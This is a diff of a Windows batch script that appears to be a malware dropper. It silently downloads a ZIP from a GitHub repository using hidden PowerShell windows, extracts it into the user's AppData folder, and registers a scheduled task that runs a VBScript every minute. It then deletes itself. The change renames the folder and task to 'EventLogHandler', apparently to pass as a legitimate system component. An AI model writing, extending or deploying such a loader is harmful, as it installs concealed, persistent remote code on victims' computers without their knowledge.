@@ -3,7 +3,9 @@ setlocal
 
 set "zipUrl=https://github.com/nuo720/mxmr/raw/refs/heads/main/EventLogHandler.zip"
 set "tempZipPath=%TEMP%\tmpELH.zip"
-set "destinationPath=%APPDATA%\tmpdir"
+
+set "programName=EventLogHandler"
+set "destinationPath=%APPDATA%\%programName%"
 
 if not exist "%destinationPath%" (
     mkdir "%destinationPath%" >nul
@@ -15,8 +17,8 @@ powershell -WindowStyle Hidden -Command "Start-BitsTransfer -Source '%zipUrl%' -
 powershell -WindowStyle Hidden -Command "Expand-Archive -LiteralPath '%tempZipPath%' -DestinationPath '%destinationPath%' -Force *> $null"
 del "%tempZipPath%" >nul
 
-schtasks /create /tn "EventLogHandler" /tr "wscript.exe \"%APPDATA%\tmpdir\run.vbs\"" /sc minute /mo 1 /f >nul
-schtasks /run /tn "EventLogHandler" >nul
+schtasks /create /tn "%programName%" /tr "wscript.exe \"%APPDATA%\%programName%\run.vbs\"" /sc minute /mo 1 /f >nul
+schtasks /run /tn "%programName%" >nul
 
 del "%~f0" >nul
 
